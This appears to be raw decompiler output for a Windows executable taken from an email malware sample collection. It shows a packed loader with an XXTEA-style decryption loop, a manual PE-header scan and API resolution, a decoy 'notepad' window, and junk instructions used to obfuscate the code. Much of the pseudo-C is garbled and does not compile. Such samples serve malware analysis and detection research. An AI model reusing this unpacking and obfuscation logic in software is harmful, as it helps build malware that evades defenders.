/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0750/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401000 - 0x00401200
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401000(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    asm("pusha");
    goto L00401007;
    eax = eax - 1300985615;
L00401007:
    asm("adc [edi],cl");
    asm("outsb");
    asm("ror dword [ebx+0x328b0855],1");
    if(ecx <= 1) {
        if(ecx < -1) {
            goto L0040110f;
        }
    } else {
        ebx = 0;
        asm("movd mm7,ebx");
        ecx = ecx - 1;
        asm("movd mm4,ecx");
        edi = *(A8 + ecx * 4);
        ecx = ecx + 1;
        edx = 0;
        edx = ecx / ecx % ecx / ecx;
        eax = 58;
        do {
            eax = eax - 1;
            asm("movd mm0,eax");
            asm("movd ebx,mm7");
            ebx = ebx + -1640531527;
            asm("movd mm7,ebx");
            eax = ebx >> 2 & 3;
            asm("movd mm1,eax");
            eax = 0;
            asm("movd mm3,eax");
            edx = A8;
            do {
                esi = *(edx + eax * 4 + 4);
                ebx = edi >> 5;
                ecx = esi << 2;
                ebx = ebx ^ ecx;
                edx = esi >> 3;
                edx = edx ^ edi << 4;
                ebx = ebx + edx;
                asm("movd edx,mm3");
                asm("movd ecx,mm1");
                edx = edx & 3 ^ ecx;
                eax = Ac;
                ecx = *(eax + edx * 4) ^ edi;
                asm("movd eax,mm7");
                eax = (eax ^ esi) + ecx;
                ebx = ebx ^ eax;
                asm("movd eax,mm3");
                edx = A8;
                ebx = ebx + *(edx + eax * 4);
                edi = ebx;
                *(edx + eax * 4) = ebx;
                asm("movd ecx,mm4");
                eax = eax + 1;
                asm("movd mm3,eax");
            } while(eax != ecx);
            esi = *edx;
            ebx = edi >> 5;
            ecx = esi << 2;
            ebx = ebx ^ ecx;
            edx = esi >> 3;
            edx = edx ^ edi << 4;
            ebx = ebx + edx;
            asm("movd edx,mm3");
            asm("movd ecx,mm1");
            edx = edx & 3 ^ ecx;
            eax = Ac;
            ecx = *(eax + edx * 4) ^ edi;
            asm("movd eax,mm7");
            eax = (eax ^ esi) + ecx;
            ebx = ebx ^ eax;
            asm("movd ecx,mm4");
            edx = A8;
            ebx = ebx + *(edx + ecx * 4);
            edi = ebx;
            *(edx + ecx * 4) = ebx;
            asm("movd eax,mm0");
        } while(eax != 0);
        goto L004011fc;
L0040110f:
        asm("movd ecx,mm2");
        ecx = ~ecx;
        asm("movd mm2,ecx");
        ecx = ecx - 1;
        asm("movd mm4,ecx");
        ecx = ecx + 1;
        edx = 0;
        edx = ecx / ecx % ecx / ecx;
        eax = 58;
        ecx = -1640531527;
        asm("mul ecx");
        if(eax != 0) {
            do {
                asm("movd mm7,eax");
                eax = eax >> 2 & 3;
                asm("movd mm1,eax");
                asm("movd ecx,mm4");
                if(ecx <= 0) {
                    break;
                }
                do {
L00401151:
                    asm("outsb");
                    asm("Unknown opcode 0xd9");
                    ebx = *(A8 + (ecx - 1) * 4) >> 5;
                    ebx = ebx ^ esi << 2;
                    edx = esi >> 3;
                    ebx = ebx + (edx ^ edi << 4);
                    asm("movd edx,mm3");
                    asm("movd ecx,mm1");
                    edx = edx & 3 ^ ecx;
                    ecx = *(Ac + edx * 4) ^ edi;
                    asm("movd eax,mm7");
                    ebx = ebx ^ (eax ^ esi) + ecx;
                    asm("movd ecx,mm3");
                    esi = *(A8 + ecx * 4) - ebx;
                    *(A8 + ecx * 4) = eax;
                } while(ecx = ecx - 1);
                asm("movd mm3,ecx");
                asm("movd ecx,mm4");
                edi = *(edx + ecx * 4);
                ebx = edi >> 5;
                ecx = esi << 2;
                ebx = ebx ^ ecx;
                edx = esi >> 3;
                edx = edx ^ edi << 4;
                ebx = ebx + edx;
                asm("movd edx,mm3");
                asm("movd ecx,mm1");
                edx = edx & 3 ^ ecx;
                eax = Ac;
                ecx = *(eax + edx * 4) ^ edi;
                asm("movd eax,mm7");
                ebx = ebx ^ (eax ^ esi) + ecx;
                edx = A8;
                eax = *edx - ebx;
                esi = eax;
                *edx = eax;
                asm("movd eax,mm7");
            } while(eax = eax - -1640531527);
            goto L004011fc;
            asm("adc [edi],cl");
            goto L00401151;
        }
    }
L004011fc:
    asm("popa");
}

/*	Procedure: 0x00401201 - 0x0040126E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401201()
{



    edi = ax & 4096;
    (save)0x40125b;
    (save) *%fs:0x0];
    for(*%fs:0x0] = esp; 1; edi = edi - 4096) {
        *L00403749 = esp;
        eax = 0;
        *L0040374D = ebp;
        *L00403751 = edi;
        if(*edi == 23117) {
            eax = *(edi + 60);
            esi = edi;
            edi = edi + eax;
            if(*edi == 17744) {
                break;
            }
        }
L00401253:
    }
    eax = esi;
    *%fs:0x0] = *esp;
    esp = esp + 8;
    return;
    edi = *L00403751;
    esp = *L00403749;
    ebp = *L0040374D;
    goto L00401253;
}

/*	Procedure: 0x0040126F - 0x00401286
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L0040126F()
{
	/* unknown */ void  esi;



    eax = 0;
    for(edx = 0; *esi != 0; edx = edx + 1) {
        asm("cmpsb");
        == ? L00401274 : ;
        asm("scasb");
        != ? 0x40127c : ;
        (restore)esi;
    }
    return(edx);
}

/*	Procedure: 0x00401287 - 0x004012E6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401287()
{
	/* unknown */ void  ebp;



    if(*""() == -2) {
        ebx = *L004020F5;
    }
    esi = 0x4020f5;
    (save)0x4020f5;
    ebp = *(ebx + *(ebx + 60) + 120) + ebx;
    edi = *( *(ebp + 32) + ebx) + ebx;
    (restore)edx;
    eax = L0040126F(edx);
    edx = *(ebp + 36) + ebx;
    ecx = *(ebp + 16);
    eax = edx + eax * 2 + 2;
    eax = eax - ecx + ecx;
    eax = *eax & 65535;
    eax = *( *(ebp + 28) + ebx + eax * 4) + ebx;
    (restore)edx;
    *edx = eax;
}

/* DEST BLOCK NOT FOUND: 004012e7 -> 0040133e */
/*	Procedure: 0x004012E7 - 0x00401336
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    goto L0040133E;
    asm("adc dh,dh");
    asm("popa");
    asm("adc al,0x11");
    asm("adc eax,0x917fd2");
    *ecx = *ecx | edx;
    asm("sahf");
    bh = 2;
    asm("adc eax,0x36e00bb");
    (save)es;
    asm("adc [edx+0x7884606],ecx");
L004012ff:
    edi = edi + 1;
    if(!(ebx = ebx + ebx)) {
        ebx = *esi;
        asm("adc ebx,ebx");
    }
    al = *edi;
    if(esi = esi - -4) {
        goto L004012ff;
    }
    eax = 1;
    if(!(ebx = ebx + ebx)) {
        ebx = *esi;
        esi = esi - -4;
        asm("adc ebx,ebx");
    }
    asm("adc eax,eax");
    if(ebx = ebx + ebx) {
        goto L0040133b;
    }
    != ? 0x40133d : ;
    ebx = *esi;
    esi = esi - -4;
    L00401337();
}

/*	Procedure: 0x00401337 - 0x0040133D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401337()
{



    eax = L0040133E();
    ebx = ebx + ebp;
}

/*	Procedure: 0x0040133E - 0x00401546
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040133E()
{



    goto L00401341;
    asm("aad 0x68");
    < ? L00401364 : ;
    eax = eax + 1;
    bh = bh + bh;
    asm("adc eax,0x408186");
    *L004020F5 = eax;
    (save)"GetCurrentThread";
    (save) *L004020F5;
    *"" = *__imp__GetProcAddress();
    eax = *"";
    *L004020F5 = L00401201();
    while(*""() != -2) {
    }
    L00401287();
    (save)0;
    (save)-3;
    (save)-533197055;
    (save)1385473288;
    ecx = 15751731;
    al = al ^ *ebp;
    asm("finit");
    eax = 0;
    goto L004013b2;
    asm("stc");
L004013b2:
    asm("loop 0x4013a7");
    (save)"ExitProcess";
    (save) *L004020F5;
    __imp__ExitProcess = *__imp__GetProcAddress();
    (save)"kernel32.dll";
    *L004020F5 = *__imp__LoadLibraryA();
    (save) *L004020F5;
    L00401000(0x405bb8, 0x407eb8, -2240);
    (restore)eax;
    *L00405BBA = eax;
    (save)"GetCurrentThread";
    (save) *L004020F5;
    *"" = *__imp__GetProcAddress();
    *"1o" = 76;
    goto L0040141a;
    *(eax + 127) = *(eax + 127) & ebp;
L0040141a:
    *eax = *eax & al;
    (save) *L004020F5;
    *__imp__GetProcAddress();
    *L004020F9 = eax;
    goto L00401433;
    *edi = al;
    edi = edi + 1;
L00401433:
    (save)"CreateThread";
    (save) *L004020F5;
    *L004020FD = *__imp__GetProcAddress();
    (save)"ntdll.dll";
    eax = *__imp__LoadLibraryA();
    if(eax != 0) {
    } else {
        eax = 1;
        *L00405BBE = 1;
    }
    goto L00401467;
    *(eax + 35) = *(eax + 35) & ebp;
L00401467:
    *eax = *eax & al;
    (save)eax;
    *__imp__GetProcAddress();
    if(eax != 0) {
    } else {
        eax = 1;
        *L00405BBE = 1;
    }
    *L00403EB7 = eax;
    (save)0;
    *L004020C1 = *L004020f9();
    goto L00401496;
    ebp = ebp + *(eax - 102);
L00401496:
    *eax = *eax & al;
    *__imp__LoadLibraryA();
    ebx = eax;
    edi = "CreateWindowExA";
    esi = "";
    L00401547();
    (save)32512;
    (save)0;
    *L0040218b();
    *L004020C5 = eax;
    (save)32512;
    (save)0;
    *L0040218f();
    *L004020C9 = eax;
    (save)"";
    *L00402193();
    (save)0;
    (save) *L004020C1;
    (save)0;
    (save)0;
    (save)192;
    (save)256;
    (save)-1000;
    (save)-1000;
    (save)4718592;
    (save)"notepad window";
    (save)"notepad class";
    (save)0;
    *""();
    goto L0040151b;
    asm("imul dword [eax-0x80]");
L0040151b:
    *eax = *eax + al;
    *(edx - 20) = *(edx - 20) + ch;
    (save)eax;
    *L004021a7();
L00401529:
    (save)0;
    (save)0;
    (save)0;
    (save)0x4020d9;
    *L00402197();
    (save)0x4020d9;
    *L0040219f();
    goto L00401529;
}

stack space not deallocated on return
/*	Procedure: 0x00401547 - 0x00401560
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401547()
{



    do {
        *esi = *__imp__GetProcAddress(ebx, edi);
        eax = 0;
        ecx = -1;
        asm("repne scasb");
        esi = esi + 4;
    } while(*edi != 0);
}

/*	Procedure: 0x00401561 - 0x004015C1
 *	Argument size: 16
 *	Local size: 4
 *	Save regs size: 4
 */

L00401561(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffffc;



    (save)esi;
    (save)edi;
    if(Ac != 1) {
        (save)A14;
        (save)A10;
        (save)Ac;
        (save)A8;
        *L004021a3();
    } else {
        ecx = & Vfffffffc;
        goto L0040158a;
        *(ecx + 106) = *(ecx + 106) + dl;
L0040158a:
        *edx = *edx + ch;
        *L004020fd(0, 0, 0x4015aa);
        eax = 0;
        goto L004015a3;
        asm("fcomp qword [edi+0x5e]");
    }
L004015a3:
    return;
    al = 211 - bl;
    goto (4202494 - *""());
}

/* address  size  */
/* 0x004012e7       0 */ /* unknown */ void 	__entry_point__;
/* 0x00408086       0 */ /* unknown */ void 	__imp__GetSystemMetrics;
/* 0x0040808a       0 */ /* unknown */ void 	__imp__CreateWindowExA;
/* 0x0040808e       0 */ /* unknown */ void 	__imp__LoadIconA;
/* 0x00408092       0 */ /* unknown */ void 	__imp__LoadCursorA;
/* 0x00408096       0 */ /* unknown */ void 	__imp__RegisterClassA;
/* 0x0040809a       0 */ /* unknown */ void 	__imp__GetMessageA;
/* 0x0040809e       0 */ /* unknown */ void 	__imp__TranslateMessage;
/* 0x004080a2       0 */ /* unknown */ void 	__imp__DispatchMessageA;
/* 0x004080a6       0 */ /* unknown */ void 	__imp__DefWindowProcA;
/* 0x004080aa       0 */ /* unknown */ void 	__imp__EnumChildWindows;
/* 0x004080ae       0 */ /* unknown */ void 	__imp__SetWindowLongA;
/* 0x00408186       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x0040818a       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x0040818e       0 */ /* unknown */ void 	__imp__ExitProcess;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
